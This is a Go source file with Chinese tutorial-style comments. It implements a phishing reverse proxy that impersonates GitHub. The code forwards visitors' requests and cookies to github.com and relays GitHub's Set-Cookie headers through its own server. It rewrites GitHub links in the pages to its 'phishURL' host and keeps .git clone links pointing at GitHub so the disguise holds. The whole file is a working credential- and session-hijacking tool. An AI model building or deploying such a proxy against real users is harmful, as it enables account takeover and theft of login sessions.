// main.go
package main

import (
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

const (
	upstreamURL = "https://github.com"
	phishURL    = "http://localhost:8080"
)

func handler(w http.ResponseWriter, r *http.Request) {
	// 複製請求
	req := cloneRequest(r)
	// 發出請求
	body, header := sendReqToUpstream(req)

	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
	for _, v := range header["Set-Cookie"] {
		w.Header().Add("Set-Cookie", v)
	}

	// 取代後的 body
	body = replaceURLInResp(body, header)

	//回覆 html 頁面給瀏覽器
	w.Write(body)
	//w.Write([]byte("Hello World"))
}

// 複製請求
func cloneRequest(r *http.Request) *http.Request {
	// 取得原請求的 method、body
	method := r.Method
	body := r.Body

	// 取得原請求的 url，把它的域名替換成真正的 Github
	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := upstreamURL + path + "?" + rawQuery

	// 建立新的 http.Request
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}
	// 把原請求的 cookie 複製到 req 的 cookie 裡面
	// 這樣請求被發到 Github 時就會帶上 cookie
	req.Header["Cookie"] = r.Header["Cookie"]
	return req
}

// 發出請求
// body 的型別是 Reader，有點像 Stream（串流）的概念，要用 ioutil.ReadAll 把它讀取出來變成 []byte
func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
	// 建立 http client
	client := http.Client{}

	// client.Do(req) 會發出請求到 Github、得到回覆 resp
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	// 把回覆的 body 從 Reader（串流）轉成 []byte
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	resp.Body.Close()

	// 回傳 body, 取得 http header
	return respBody, resp.Header
}

//取代html中所有https://github.com 網址為 http://localhost:8080
func replaceURLInResp(body []byte, header http.Header) []byte {
	// 判斷 Content-Type 是不是 text/html
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")

	// 如果不是 HTML 就不取代
	if !isHTML {
		return body
	}

	// 把 https://github.com 取代為 http://localhost:8080
	// strings.Replace 最後一個參數是指最多取代幾個，-1 就是全部都取代
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)
	// 取代所有clone的網址回github
	// 尋找符合 git 網址的特徵
	re, err := regexp.Compile(`http://localhost:8080(.*)\.git`)
	if err != nil {
		panic(err)
	}

	// 取代成 github 網址
	bodyStr = re.ReplaceAllString(bodyStr, `https://github.com$1.git`)

	return []byte(bodyStr)
}

func main() {
	http.HandleFunc("/", handler)
	// 錯誤處理，如果有回傳錯誤就直接終止程式並return error
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		panic(err)
	}
}
